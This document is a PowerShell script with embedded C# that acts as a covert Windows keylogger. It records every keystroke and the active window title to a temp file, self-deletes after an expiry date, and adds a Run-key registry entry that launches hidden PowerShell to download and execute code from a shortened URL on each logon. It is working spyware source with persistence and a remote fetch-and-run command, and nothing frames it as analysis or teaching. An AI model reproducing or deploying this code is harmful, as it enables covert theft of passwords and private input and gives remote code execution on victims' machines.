# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Set the default expiry date to 30 days from today if no expiry date is passed
if ($args.Count -gt 1) {
    # If the second argument is provided, parse it as the expiry date
    $expiryDate = [datetime]::ParseExact($args[1], 'yyyy-MM-dd', $null)
} else {
    # If no expiry date is passed, default to 30 days from today
    $expiryDate = (Get-Date).AddDays(30)
}

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Check if the custom utility type is already loaded
$customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
    $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
}

if (-not $customUtilityType) {
    # Add Type for custom utility class
    Add-Type @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Drawing;  // For screenshot
using System.Drawing.Imaging;  // For saving screenshot in .png format

public class KeyCaptureUtility
{
    // DLL Imports for keyboard input functions
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    // DLL Import for getting the active window title
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    public static void CaptureInput(string filePath)
    {
        StringBuilder captureBuffer = new StringBuilder();
        var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
        TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);
        HashSet<int> pressedKeys = new HashSet<int>();  // To track pressed keys

        // Ensure the file exists, create it if it doesn't
        if (!File.Exists(filePath))
        {
            File.Create(filePath).Dispose();
        }

        // Continuous loop to capture keypresses
        while (true)
        {
            bool keyPressed = false;

            // Check if the last key press time exceeds threshold
            while (lastKeypressTime.Elapsed < keypressThreshold)
            {
                Thread.Sleep(30);  // Sleep for 30 ms

                // Iterate through all possible virtual keycodes
                for (int asc = 8; asc <= 254; asc++)
                {
                    short keyst = GetAsyncKeyState(asc);

                    // Check if the key is pressed (key state = -32767 means pressed)
                    if ((keyst & 0x8000) != 0 && !pressedKeys.Contains(asc)) // Only capture the first press
                    {
                        pressedKeys.Add(asc); // Mark this key as pressed
                        keyPressed = true;
                        lastKeypressTime.Restart();  // Reset inactivity timer

                        // Translate the key to a readable character
                        int vtkey = MapVirtualKey((uint)asc, 3);
                        byte[] kbst = new byte[256];
                        GetKeyboardState(kbst);
                        StringBuilder logChar = new StringBuilder();

                        // Get the character for the key
                        int unicodeResult = ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0);

                        // If ToUnicode returns a valid character
                        if (unicodeResult > 0)
                        {
                            string charPressed = logChar.ToString();

                            // Handle special keys based on provided mapping
                            charPressed = HandleSpecialKeys(asc, charPressed);

                            captureBuffer.Append(charPressed);
                        }
                        else
                        {
                            // If the key is non-printable, handle the special keys separately
                            string specialKey = HandleSpecialKeys(asc, null);
                            if (!string.IsNullOrEmpty(specialKey))
                            {
                                captureBuffer.Append(specialKey);
                            }
                        }
                    }
                    else if ((keyst & 0x8000) == 0 && pressedKeys.Contains(asc)) // Key was released
                    {
                        pressedKeys.Remove(asc); // Remove from pressed set when key is released
                    }
                }
            }

            if (keyPressed)
            {
                // Get the active window title
                string activeWindowTitle = GetActiveWindowTitle();

                // Save input to the file with a timestamp and active window information
                string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                string message = timestamp + " : " + captureBuffer.ToString() + " [Active Window: " + activeWindowTitle + "]\r\n";
                File.AppendAllText(filePath, message);
                captureBuffer.Clear();  // Clear the input buffer after saving
            }

            // Reset the stopwatch and continue checking
            lastKeypressTime.Restart();
        }
    }

    // Handle special keys manually
    public static string HandleSpecialKeys(int asc, string charPressed)
    {
        // Handle known special keys
        switch (asc)
        {
            case 8: return "[BKSP]";  // Backspace
            case 9: return "[TAB]";  // Tab
            case 13: return "[ENTER]";  // Enter
            case 27: return "[ESC]";  // Escape
            case 32: return "[SPACE]";  // Space bar
            case 37: return "[LEFT]";  // Left Arrow
            case 38: return "[UP]";  // Up Arrow
            case 39: return "[RIGHT]";  // Right Arrow
            case 40: return "[DOWN]";  // Down Arrow
            case 46: return "[DEL]";  // Delete
            case 91: return "[WINDOWS]";  // Windows key
            case 160: return "[SHIFT]";  // Left Shift
            case 162: return "[CONTROL]";  // Left Control
            case 163: return "[RIGHT CONTROL]";  // Right Control
            case 164: return "[LEFT ALT]";  // Left Alt
            case 165: return "[RIGHT ALT]";  // Right Alt
            case 220: return "[BACKSLASH]";  // Backslash
            case 20: return "[CAPSLOCK]";  // Caps Lock
            case 144: return "[NUMLOCK]";  // Num Lock
            case 145: return "[SCROLLLOCK]";  // Scroll Lock
            case 112: return "[F1]";  // F1
            case 113: return "[F2]";  // F2
            case 114: return "[F3]";  // F3
            case 115: return "[F4]";  // F4
            case 116: return "[F5]";  // F5
            case 117: return "[F6]";  // F6
            case 118: return "[F7]";  // F7
            case 119: return "[F8]";  // F8
            case 120: return "[F9]";  // F9
            case 121: return "[F10]";  // F10
            case 122: return "[F11]";  // F11
            case 123: return "[F12]";  // F12
            default:
                return charPressed;  // Return original character if it's a printable key
        }
    }

    // Method to get the active window's title
    public static string GetActiveWindowTitle()
    {
        IntPtr hwnd = GetForegroundWindow();
        StringBuilder windowTitle = new StringBuilder(256);
        GetWindowText(hwnd, windowTitle, 256);
        return windowTitle.ToString();
    }
}

"@
}

# Convert the expiry date to 'yyyy-MM-dd' format
$expiryDateFormatted = $expiryDate.ToString('yyyy-MM-dd')

# Add the script to startup (by modifying the registry) with the provided URL
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "Startup"
$regCommand = "powershell -NoP -Ep Bypass -W H -C `$expiryDate='$expiryDateFormatted'; irm https://shorturl.at/FkQqM | iex"

# Add the entry to the registry for startup
Set-ItemProperty -Path $regKeyPath -Name $scriptName -Value $regCommand

# Call the CaptureInput method to start capturing inputs (synchronously)
[KeyCaptureUtility]::CaptureInput($tempFilePath)
